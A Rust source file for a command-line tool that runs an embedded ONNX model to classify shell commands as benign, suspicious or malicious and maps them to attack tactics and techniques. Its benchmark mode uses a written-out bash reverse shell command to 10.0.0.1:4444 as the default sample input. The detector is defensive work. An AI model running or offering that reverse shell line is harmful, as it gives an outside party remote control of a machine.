use std::collections::HashMap;
use std::io::{self, BufRead, Write};
use std::time::Instant;

use ort::session::Session;
use ort::value::Tensor;

mod labels;
use labels::*;

static MODEL: &[u8] = include_bytes!("../model_int8.onnx");

fn vocab() -> &'static str {
    std::str::from_utf8(include_bytes!("../vocab.txt")).unwrap()
}

const MAX_SEQ: usize = 256;

fn ascii_lower(c: char) -> char {
    if c.is_ascii_uppercase() { (c as u8 + 32) as char } else { c }
}

fn is_punct_ascii(c: char) -> bool {
    matches!(c, '!' | '"' | '#' | '$' | '%' | '&' | '\'' | '(' | ')' | '*' | '+' |
        ',' | '-' | '.' | '/' | ':' | ';' | '<' | '=' | '>' | '?' | '@' |
        '[' | '\\' | ']' | '^' | '_' | '`' | '{' | '|' | '}' | '~')
}

fn build_vocab() -> HashMap<&'static str, i64> {
    let mut map = HashMap::new();
    for (id, line) in vocab().lines().enumerate() {
        map.insert(line, id as i64);
    }
    map
}

fn emit_wordpiece(word: &str, vocab: &HashMap<&str, i64>, out: &mut Vec<i64>) {
    if let Some(&id) = vocab.get(word) {
        out.push(id);
        return;
    }
    let bytes = word.as_bytes();
    let mut off = 0usize;
    let mut failed = false;
    while off < bytes.len() {
        let mut found = None;
        for l in (1..=bytes.len() - off).rev() {
            let sub = std::str::from_utf8(&bytes[off..off + l]).unwrap();
            let key = if off == 0 { sub.to_string() } else { format!("##{sub}") };
            if let Some(&id) = vocab.get(key.as_str()) {
                found = Some((id, l));
                break;
            }
        }
        match found {
            Some((id, l)) => { out.push(id); off += l; }
            None => { failed = true; break; }
        }
    }
    if failed { out.push(UNK_TOKEN_ID); }
}

fn tokenize_command(text: &str, vocab: &HashMap<&str, i64>) -> Vec<i64> {
    let mut out = Vec::new();
    let mut word = String::new();
    for c in text.chars() {
        if c.is_whitespace() || is_punct_ascii(c) {
            if !word.is_empty() {
                emit_wordpiece(&word, vocab, &mut out);
                word.clear();
            }
            if is_punct_ascii(c) && c != ' ' {
                let p = c.to_string();
                if let Some(&id) = vocab.get(p.as_str()) { out.push(id); } else { out.push(UNK_TOKEN_ID); }
            }
        } else {
            word.push(ascii_lower(c));
        }
    }
    if !word.is_empty() { emit_wordpiece(&word, vocab, &mut out); }
    out
}

fn build_input(tokens: Vec<i64>) -> (Vec<i64>, Vec<i64>) {
    let mut ids: Vec<i64> = LABEL_PREFIX_TOKENS.to_vec();
    ids.extend(tokens);
    ids.push(SEP_TOKEN_ID);
    let n = ids.len().min(MAX_SEQ);
    ids.truncate(n);
    let mut mask = vec![1i64; n];
    ids.resize(MAX_SEQ, PAD_TOKEN_ID);
    mask.resize(MAX_SEQ, 0);
    (ids, mask)
}

fn run(session: &mut Session, ids: &[i64], mask: &[i64]) -> ort::Result<Vec<f32>> {
    let out = session.run(ort::inputs![
        "input_ids" => Tensor::<i64>::from_array(([1, MAX_SEQ], ids.to_vec()))?,
        "attention_mask" => Tensor::<i64>::from_array(([1, MAX_SEQ], mask.to_vec()))?,
    ])?;
    let (_, logits) = out["logits"].try_extract_tensor::<f32>()?;
    Ok(logits.to_vec())
}

fn softmax3(logits: &[f32]) -> [f32; 3] {
    let max = logits[0].max(logits[1]).max(logits[2]);
    let e0 = (logits[0] - max).exp();
    let e1 = (logits[1] - max).exp();
    let e2 = (logits[2] - max).exp();
    let s = e0 + e1 + e2;
    [e0 / s, e1 / s, e2 / s]
}

struct Decision {
    verdict: usize,
    verdict_probs: [f32; 3],
    actions: Vec<usize>,
    action_probs: Vec<f32>,
    tactics: Vec<usize>,
    techniques: Vec<usize>,
}

fn decide(logits: &[f32]) -> Decision {
    let vp = softmax3(logits);
    let verdict = if vp[0] >= vp[1] && vp[0] >= vp[2] { 0 } else if vp[1] >= vp[2] { 1 } else { 2 };
    let mut actions = Vec::new();
    let mut action_probs = Vec::with_capacity(ACTION_NAMES.len());
    for (i, _) in ACTION_NAMES.iter().enumerate() {
        let p = 1.0 / (1.0 + (-logits[3 + i]).exp());
        action_probs.push(p);
        if p >= 0.5 { actions.push(i); }
    }
    let mut tactic_bits = 0u32;
    let mut tech_bits = 0u32;
    for &a in &actions {
        tactic_bits |= ACTION_TACTIC_BITMAP[a];
        tech_bits |= ACTION_TECH_BITMAP[a];
    }
    let mut tactics = Vec::new();
    for (i, _) in TACTIC_NAMES.iter().enumerate() {
        if tactic_bits & (1 << i) != 0 { tactics.push(i); }
    }
    let mut techniques = Vec::new();
    for (i, _) in TECHNIQUE_NAMES.iter().enumerate() {
        if tech_bits & (1 << i) != 0 { techniques.push(i); }
    }
    Decision { verdict, verdict_probs: vp, actions, action_probs, tactics, techniques }
}

fn print_plain(cmd: &str, d: &Decision) {
    println!("command         : {cmd}");
    println!("verdict         : {}", VERDICT_NAMES[d.verdict]);
    println!("verdict_probs   : benign={:.4} suspicious={:.4} malicious={:.4}",
             d.verdict_probs[0], d.verdict_probs[1], d.verdict_probs[2]);
    print!("actions         :");
    if d.actions.is_empty() { print!(" (none)"); }
    for &a in &d.actions { print!(" {}", ACTION_NAMES[a]); }
    println!();
    print!("tactics         :");
    if d.tactics.is_empty() { print!(" (none)"); }
    for &t in &d.tactics { print!(" {}", TACTIC_NAMES[t]); }
    println!();
    print!("techniques      :");
    if d.techniques.is_empty() { print!(" (none)"); }
    for &t in &d.techniques { print!(" {}", TECHNIQUE_NAMES[t]); }
    println!();
}

fn print_json(d: &Decision) {
    print!("{{\"verdict\":\"{}\",\"verdict_probs\":{{", VERDICT_NAMES[d.verdict]);
    for i in 0..3 {
        if i > 0 { print!(","); }
        print!("\"{}\":{:.4}", VERDICT_NAMES[i], d.verdict_probs[i]);
    }
    print!("}},\"actions\":[");
    for (j, &a) in d.actions.iter().enumerate() {
        if j > 0 { print!(","); }
        print!("\"{}\"", ACTION_NAMES[a]);
    }
    print!("],\"tactics\":[");
    for (j, &t) in d.tactics.iter().enumerate() {
        if j > 0 { print!(","); }
        print!("\"{}\"", TACTIC_NAMES[t]);
    }
    print!("],\"techniques\":[");
    for (j, &t) in d.techniques.iter().enumerate() {
        if j > 0 { print!(","); }
        print!("\"{}\"", TECHNIQUE_NAMES[t]);
    }
    println!("]}}");
}

fn main() -> ort::Result<()> {
    let args: Vec<String> = std::env::args().skip(1).collect();
    let vocab = build_vocab();
    let env = ort::init().build()?;
    let mut session = Session::builder(&env)?.commit_from_memory(MODEL)?;

    let mut json_mode = false;
    let mut stdin_mode = false;
    let mut bench_mode = false;
    let mut cmds: Vec<String> = Vec::new();
    for a in args {
        match a.as_str() {
            "--json" => json_mode = true,
            "-" => stdin_mode = true,
            "--bench" => bench_mode = true,
            _ => cmds.push(a),
        }
    }

    let predict_one = |cmd: &str, session: &mut Session| -> ort::Result<Decision> {
        let tokens = tokenize_command(cmd, &vocab);
        let (ids, mask) = build_input(tokens);
        let logits = run(session, &ids, &mask)?;
        Ok(decide(&logits))
    };

    if stdin_mode {
        let stdin = io::stdin();
        for line in stdin.lock().lines() {
            let line = line.unwrap_or_default();
            let line = line.trim_end_matches(['\r', '\n']);
            if line.is_empty() { continue; }
            let d = predict_one(line, &mut session)?;
            if json_mode { print_json(&d); } else { println!("{}", VERDICT_NAMES[d.verdict]); }
        }
        return Ok(());
    }

    if bench_mode {
        let cmd = if cmds.is_empty() { "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1".to_string() } else { cmds[0].clone() };
        let tokens = tokenize_command(&cmd, &vocab);
        let (ids, mask) = build_input(tokens);
        for _ in 0..10 { let _ = run(&mut session, &ids, &mask)?; }
        let n = 200usize;
        let t = Instant::now();
        for _ in 0..n { let _ = run(&mut session, &ids, &mask)?; }
        let dt = t.elapsed();
        println!("bench runs={n} total_ms={:.2} avg_ms={:.3}", dt.as_secs_f64() * 1e3, dt.as_secs_f64() * 1e3 / n as f64);
        return Ok(());
    }

    if cmds.is_empty() { cmds.push("ls -la /tmp".to_string()); }
    for cmd in &cmds {
        let d = predict_one(cmd, &mut session)?;
        if json_mode { print_json(&d); } else { print_plain(cmd, &d); }
    }
    let _ = io::stdout().flush();
    Ok(())
}
